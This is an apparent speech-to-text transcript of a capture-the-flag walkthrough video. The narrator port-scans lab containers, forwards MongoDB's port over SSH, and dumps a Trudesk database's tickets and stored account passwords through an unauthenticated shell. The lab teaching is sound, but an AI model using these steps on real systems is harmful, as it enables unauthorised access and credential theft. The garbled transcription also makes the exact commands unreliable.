do DNS there we go that's so much quicker without DNS and we can see all the ports on each of these containers uh we have my sequel on uh 0.2 0.4 has FTP HTTP and https and I want to say if we did a full port scan on 0.4 it has some more things let's see Dash p dash see what happens maybe not wow that is really quick let's do one two eight I guess uh we have three three zero six zero on 0.2 C Port 8118 I don't know what port that is let's see Port 8118 it's not exactly saying what it is let's check for other ones uh 27017 so let's copy this search for this and we see this is mongodb so if we forwarded the port then we could um execute commands on this if there's no authentication I'm going to see if exists on this host it does not see do I have I do not pseudo apt install  mongodb at search I can type let's see lib mongod  sh maybe that's what I want yeah that looks fine so we want to afford two seven zero one seven so Dash l two seven zero one seven one seven two Seventeen what was that port or the host 8118 thing 0.3 0.3 27017 so now that's boarded we do sh and we can connect to this DB so from here we can just type like show DBS and see all the databases we see admin config local to desk so if I do use true desk and it can show collections and this will list all the databases here so we should be able to just do DB dot on the database so let's see tickets dot find and dump every ticket this way so if you didn't want to enumerate the um actual true desk API you could have done dumps this way uh we can also think accounts so what was it um db.accounts.find and we can dump passwords as well so you got to numerate the doc uh database if you didn't want to do that so with that being said that's gonna be the Box hope you enjoyed it take care and I will see you all next time